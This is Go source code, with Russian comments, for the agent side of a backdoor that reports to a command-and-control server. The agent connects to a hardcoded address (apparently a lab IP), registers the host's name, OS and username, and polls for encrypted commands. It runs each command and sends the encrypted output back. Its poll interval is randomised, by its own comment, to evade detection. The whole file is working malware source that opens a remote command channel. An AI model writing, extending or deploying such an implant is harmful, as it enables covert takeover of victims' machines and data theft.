// Package agent реализует клиента-бэкдор: подключение к C2,
// регистрацию, опрос задач, выполнение команд и отправку результата.
package agent

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strings"
	"time"

	"c2project/internal/crypto"
	"c2project/internal/packet"
	"c2project/internal/protocol"
)

// Config — настройки агента.
type Config struct {
	C2Address string
	PollMin   time.Duration // минимальная пауза между опросами
	PollMax   time.Duration // максимальная пауза между опросами
	Reconnect time.Duration
}

// DefaultConfig возвращает настройки по умолчанию.
func DefaultConfig() Config {
	return Config{
		C2Address: "192.168.56.104:445",
		PollMin:   2 * time.Second,
		PollMax:   5 * time.Second,
		Reconnect: 10 * time.Second,
	}
}

// Agent — клиент-бэкдор.
type Agent struct {
	cfg      Config
	executor *Executor
}

// New создаёт агента.
func New(cfg Config) *Agent {
	return &Agent{cfg: cfg, executor: NewExecutor()}
}

// Run запускает цикл подключений с переподключением при ошибке.
func (a *Agent) Run(ctx context.Context) error {
	for {
		if ctx.Err() != nil {
			return nil
		}
		if err := a.session(ctx); err != nil {
			log.Printf("[CLIENT] сессия завершена: %v", err)
		}
		log.Printf("[CLIENT] переподключение через %s", a.cfg.Reconnect)
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(a.cfg.Reconnect):
		}
	}
}

// session устанавливает одно соединение и обслуживает его.
func (a *Agent) session(ctx context.Context) error {
	var d net.Dialer
	conn, err := d.DialContext(ctx, "tcp", a.cfg.C2Address)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()
	log.Printf("[CLIENT] подключение к C2 %s", a.cfg.C2Address)

	if err := a.register(conn); err != nil {
		return fmt.Errorf("register: %w", err)
	}
	log.Printf("[CLIENT] зарегистрирован на C2")
	return a.loop(ctx, conn)
}

// register отправляет пакет регистрации и ждёт подтверждения.
func (a *Agent) register(conn net.Conn) error {
	encReg, err := crypto.Encrypt(protocol.KeyC2ToClient, []byte(buildRegistration()))
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}
	if err := packet.Write(conn, packet.New(packet.CmdRegister, 0, encReg)); err != nil {
		return err
	}
	ack, err := packet.Read(conn)
	if err != nil {
		return err
	}
	if ack.Command != packet.CmdRegisterAck {
		return fmt.Errorf("unexpected ack: %x", ack.Command)
	}
	return nil
}

// loop — основной цикл опроса задач.
func (a *Agent) loop(ctx context.Context, conn net.Conn) error {
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(a.nextPollInterval()):
		}
		if err := a.pollOnce(conn); err != nil {
			return err
		}
	}
}

// nextPollInterval возвращает случайный интервал между PollMin и PollMax.
// Рандомизация защищает от детектирования по фиксированному периоду опроса.
func (a *Agent) nextPollInterval() time.Duration {
	if a.cfg.PollMax <= a.cfg.PollMin {
		return a.cfg.PollMin
	}
	delta := a.cfg.PollMax - a.cfg.PollMin
	return a.cfg.PollMin + time.Duration(rand.Int63n(int64(delta)))
}

// pollOnce выполняет один цикл "запрос задачи — выполнение — отправка результата".
func (a *Agent) pollOnce(conn net.Conn) error {
	req := packet.New(packet.CmdGetTask, nextMessageID(), nil)
	if err := packet.Write(conn, req); err != nil {
		return fmt.Errorf("send get-task: %w", err)
	}
	resp, err := packet.Read(conn)
	if err != nil {
		return fmt.Errorf("read task: %w", err)
	}
	if resp.Command != packet.CmdTaskData || len(resp.Payload) == 0 {
		return nil
	}
	plainCmd, err := crypto.Decrypt(protocol.KeyC2ToClient, resp.Payload)
	if err != nil {
		return fmt.Errorf("decrypt command: %w", err)
	}
	cmdStr := strings.TrimSpace(string(plainCmd))
	log.Printf("[CLIENT] команда: %s", cmdStr)

	output, err := a.executor.Execute(cmdStr)
	if err != nil {
		log.Printf("[CLIENT] ошибка выполнения: %v", err)
	}

	encResult, err := crypto.Encrypt(protocol.KeyC2ToClient, []byte(output))
	if err != nil {
		return fmt.Errorf("encrypt result: %w", err)
	}
	resultPkt := packet.New(packet.CmdSendResult, nextMessageID(), encResult)
	if err := packet.Write(conn, resultPkt); err != nil {
		return fmt.Errorf("send result: %w", err)
	}
	if _, err := packet.Read(conn); err != nil {
		return fmt.Errorf("read ack: %w", err)
	}
	return nil
}

// buildRegistration формирует строку "id|hostname|os".
func buildRegistration() string {
	hostname, _ := os.Hostname()
	osName := runtime.GOOS
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}
	return fmt.Sprintf("%s-%s-%s|%s|%s", hostname, osName, user, hostname, osName)
}

func nextMessageID() uint64 {
	return uint64(time.Now().UnixNano())
}